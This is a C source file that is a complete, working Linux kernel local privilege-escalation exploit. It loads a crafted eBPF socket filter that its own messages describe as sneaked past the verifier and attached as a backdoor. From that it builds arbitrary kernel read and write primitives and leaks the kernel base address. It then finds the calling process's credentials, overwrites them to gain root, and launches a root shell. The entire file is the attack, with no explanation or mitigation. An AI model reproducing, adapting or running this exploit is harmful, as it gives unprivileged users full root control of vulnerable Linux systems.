
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){                        \
		.code = CODE,                          \
		.dst_reg = DST,                        \
		.src_reg = SRC,                        \
		.off = OFF,                            \
		.imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
	((struct bpf_insn){                    \
		.code = BPF_LD | BPF_DW | BPF_IMM, \
		.dst_reg = DST,                    \
		.src_reg = SRC,                    \
		.off = 0,                          \
		.imm = (__u32)(IMM)}),             \
		((struct bpf_insn){                \
			.code = 0,                     \
			.dst_reg = 0,                  \
			.src_reg = 0,                  \
			.off = 0,                      \
			.imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

int doredact = 0;
#define LOG_BUF_SIZE 65536
char bpf_log_buf[LOG_BUF_SIZE];
char buffer[64];
int sockets[2];
int mapfd;

void fail(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[!] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

void redact(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	if (doredact)
	{
		fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
		return;
	}
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
				   unsigned int key_size,
				   unsigned int value_size,
				   unsigned int max_entries)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.info.bpf_fd = fd;
	attr.info.info_len = info_len;
	attr.info.info = ptr_to_u64(info);
	return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
					uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
				  const struct bpf_insn *insns, int insn_cnt,
				  const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}


#define BPF_LD_ABS(SIZE, IMM)                      \
	((struct bpf_insn){                            \
		.code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
		.dst_reg = 0,                              \
		.src_reg = 0,                              \
		.off = 0,                                  \
		.imm = IMM})

#define BPF_MAP_GET(idx, dst)                                                \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)											 \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_MOV64_REG((dst), BPF_REG_0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

int load_prog()
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),
		BPF_MAP_GET(0, BPF_REG_6),
		BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 1, 1),
		BPF_EXIT_INSN(),
		BPF_LD_IMM64(BPF_REG_7, 0x100000001),
		BPF_JMP_REG(BPF_JLE, BPF_REG_6, BPF_REG_7, 1),
		BPF_EXIT_INSN(),
		BPF_JMP32_IMM(BPF_JNE, BPF_REG_6, 5, 1),
		BPF_EXIT_INSN(),
		BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 2),
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 1),
		BPF_MAP_GET(1, BPF_REG_7),	//op
		//BPF_MAP_GET(2, BPF_REG_8),	//offset
		//BPF_MAP_GET(3, BPF_REG_5),	//val
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 23),	// op=0 -> read aslr
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
		BPF_MAP_GET_ADDR(4, BPF_REG_6),
		BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
		BPF_EXIT_INSN(),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 1, 22),	// op=1 -> write btf
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xd0),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_MAP_GET(2, BPF_REG_8),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
		BPF_EXIT_INSN(),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 2, 23),	// op=2 -> read attr
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x50),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
		BPF_MAP_GET_ADDR(4, BPF_REG_6),
		BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
		BPF_EXIT_INSN(),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 3, 60),	// op=3 -> write ops and change type
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_MAP_GET(2, BPF_REG_6),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),
		BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xf8),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0x17),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0xec),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, -1),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xe4),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0),
		BPF_EXIT_INSN(),
	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

int write_msg()
{
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
	if (n < 0)
	{
		perror("write");
		return 1;
	}
	if (n != sizeof(buffer))
	{
		fprintf(stderr, "short write: %d\n", n);
	}
	return 0;
}

void update_elem(int key, size_t val)
{
	if (bpf_update_elem(mapfd, &key, &val, 0)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

size_t get_elem(int key)
{
	size_t val;
	if (bpf_lookup_elem(mapfd, &key, &val)) {
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
	}
	return val;
}

size_t read64(size_t addr)
{
	uint32_t lo, hi;
	char buf[0x50] = {0};
	update_elem(0, 2);
	update_elem(1, 1);
	update_elem(2, addr-0x58);
	write_msg();
	if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
		fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
	}
	lo = *(unsigned int*)&buf[0x40];
	update_elem(2, addr-0x58+4);
	write_msg();
	if (bpf_obj_get_info_by_fd(mapfd, 0x50, buf)) {
		fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
	}
	hi = *(unsigned int*)&buf[0x40];
	return (((size_t)hi) << 32) | lo;
}	

void clear_btf()
{
	update_elem(0, 2);
	update_elem(1, 1);
	update_elem(2, 0);
	write_msg();
}

void write32(size_t addr, uint32_t data)
{
	uint64_t key = 0;
	data -= 1;
	if (bpf_update_elem(mapfd, &key, &data, addr)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}
void write64(size_t addr, size_t data)
{
	uint32_t lo = data & 0xffffffff;
	uint32_t hi = (data & 0xffffffff00000000) >> 32;
	uint64_t key = 0;
	write32(addr, lo);
	write32(addr+4, hi);
}

int main()
{
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 0x100);
	if (mapfd < 0)
	{
		fail("failed to create map '%s'\n", strerror(errno));
	}
	redact("sneaking evil bpf past the verifier\n");
	int progfd = load_prog();
	printf("%s\n", bpf_log_buf);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}

	redact("creating socketpair()\n");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	redact("attaching bpf backdoor to socket\n");
	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}
	update_elem(0, 2);
	update_elem(1, 0);
	size_t value = 0;
	write_msg();
	size_t ops_addr = get_elem(4);
	size_t linux_base = ops_addr - 0x10169c0;
	printf("linux base: 0x%llx\n", linux_base);
	char ops[0xe8] = {0};
	for(int i=0;i<0xe8;i+=8)
	{
		*(size_t*)&ops[i] = read64(ops_addr + i);
		update_elem(0x10+i/8, *(size_t*)&ops[i]);
	}
	size_t data = read64(ops_addr);
	update_elem(0x10+0x70/8, *(size_t*)&ops[0x20]);
	update_elem(0, 2);
	update_elem(1, 2);
	write_msg();
	size_t heap_addr = get_elem(4);
	size_t values_addr = heap_addr + 0x50;
	printf("value addr: 0x%llx\n", values_addr);
	size_t init_pid_ns = linux_base + 0x1446260;
	pid_t pid = getpid();
	printf("self pid is %d\n", pid);
	size_t task_addr = read64(init_pid_ns+0x38);
	size_t cred_addr = 0;
	while(1)
	{
		pid_t p = read64(task_addr+0x490);
		printf("iter pid %d ...\n", p);
		if(p == pid)
		{
			puts("got it!");
			cred_addr = read64(task_addr+0x638);
			break;
		}
		else
		{
			task_addr = read64(task_addr+0x390) - 0x390;
		}
	}
	printf("get cred_addr 0x%llx\n", cred_addr);
	size_t usage = read64(cred_addr);
	printf("usage: %d\n", usage);
	clear_btf();
	update_elem(0, 2);
	update_elem(1, 3);
	update_elem(2, values_addr+0x80);
	write_msg();
	write32(cred_addr+4, 0);
	write64(cred_addr+8, 0);
	write64(cred_addr+16, 0);
	if(getuid() == 0)
	{
		puts("getting shell!");
		system("/bin/sh");
	}
	
}
